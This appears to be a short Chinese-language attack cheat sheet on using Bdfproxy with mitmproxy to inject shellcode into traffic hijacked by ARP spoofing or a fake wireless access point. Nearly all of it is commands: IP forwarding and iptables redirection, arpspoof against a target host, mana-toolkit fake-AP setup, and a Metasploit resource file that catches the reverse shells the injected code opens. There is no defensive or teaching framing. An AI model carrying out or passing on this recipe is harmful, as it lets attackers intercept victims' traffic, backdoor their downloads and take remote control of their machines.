

# Bdfproxy（mitmproxy）

* 描述
> 基于流量劫持动态注入 shellcode（ARP spoof、DNS spoof、Fake AP）



* 操作
``` 
// shell
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -p tcp --dport 80/443 -j REDIRECT --to-ports 8080
vi /etc/bdfproxy/bdfproxy.cfg
    // 修改
    proxyMode = transparent
    //修改侦听IP地址并启动bdfproxy
arpspoof -i eth0 -t 1.1.1.2   1.1.1.1
启动 MSF
```



* Mana 创建 Fack AP
``` 
apt-get  install  mana-toolkit
vi /etc/mana-toolkit/hostapd-mana.conf
    // 修改无线 SSID 名称
./usr/share/mana-toolkit/run-mana/start-nat-simple.sh
    // 修改 waln1 无线网卡适配器并启动
    iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80/443 -j REDIRECT --to-port 8080
vi /etc/bdfproxy/bdfproxy.cfg
    proxyMode = transparent
    //  修改侦听IP地址并启动bdfproxy
//启动msf
msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc

```
* Bdfproxy 代理注入代码
* Msf 侦听反弹 shell